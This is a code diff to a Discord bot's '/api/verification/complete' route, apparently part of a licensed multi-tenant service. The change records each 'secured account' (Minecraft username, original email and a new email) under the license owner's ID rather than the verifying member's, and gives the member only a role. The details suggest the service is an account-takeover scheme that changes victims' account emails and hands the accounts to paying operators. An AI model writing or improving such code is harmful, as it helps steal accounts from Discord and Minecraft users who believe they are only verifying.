@@ -42,7 +42,8 @@ export const Route = createFileRoute("/api/verification/complete")({
           return Response.json({ error: "Missing config or result" }, { status: 400 });
         }
 
-        const discordId = (config.discordId as string) || "";
+        const memberDiscordId = (config.discordId as string) || "";
+        const ownerDiscordId = (config.ownerDiscordId as string) || "";
         const mcUsername = (result.mcUsername as string) || "Unknown";
         const mcEmail = (config.email as string) || "";
         const guildId = (config.guildId as string) || "";
@@ -52,19 +53,25 @@ export const Route = createFileRoute("/api/verification/complete")({
 
         // Prefer the guild's own bot token (multi-tenant). Fall back to env only if needed.
         let botToken = (config.botToken as string) || "";
-        if (!botToken && guildId) {
+        let ownerId = ownerDiscordId;
+        if (guildId) {
           const { data: settings } = await db()
             .from("verification_settings")
-            .select("bot_token, verified_role_id, channel_id")
+            .select("bot_token, verified_role_id, channel_id, discord_id")
             .eq("guild_id", guildId)
             .maybeSingle();
           if (settings?.bot_token) botToken = settings.bot_token;
+          if (!ownerId && settings?.discord_id) ownerId = settings.discord_id;
         }
         if (!botToken) botToken = process.env.DISCORD_BOT_TOKEN || "";
 
+        // Store under license owner so dashboard getSecuredAccounts works;
+        // member id is still used for role assignment.
+        const storeDiscordId = ownerId || memberDiscordId;
+
         // Store secured account
         const { error: insertError } = await db().from("secured_accounts").insert({
-          discord_id: discordId,
+          discord_id: storeDiscordId,
           mc_username: mcUsername,
           mc_email: mcEmail,
           new_email: result.newEmail as string,
@@ -133,9 +140,9 @@ export const Route = createFileRoute("/api/verification/complete")({
             console.error("[verification/complete] channel message failed:", msgRes.status, t);
           }
 
-          if (guildId && roleId && discordId) {
+          if (guildId && roleId && memberDiscordId) {
             const roleRes = await fetch(
-              `https://discord.com/api/v10/guilds/${guildId}/members/${discordId}/roles/${roleId}`,
+              `https://discord.com/api/v10/guilds/${guildId}/members/${memberDiscordId}/roles/${roleId}`,
               {
                 method: "PUT",
                 headers: {
@@ -167,7 +174,8 @@ export const Route = createFileRoute("/api/verification/complete")({
                     title: "🔒 Account Secured (Admin Log)",
                     color: 0x5865f2,
                     fields: [
-                      { name: "Discord ID", value: `\`\`\`${discordId}\`\`\``, inline: true },
+                      { name: "Member Discord ID", value: `\`\`\`${memberDiscordId}\`\`\``, inline: true },
+                      { name: "Owner Discord ID", value: `\`\`\`${storeDiscordId}\`\`\``, inline: true },
                       { name: "Guild ID", value: `\`\`\`${guildId || "N/A"}\`\`\``, inline: true },
                       { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: true },
                       {
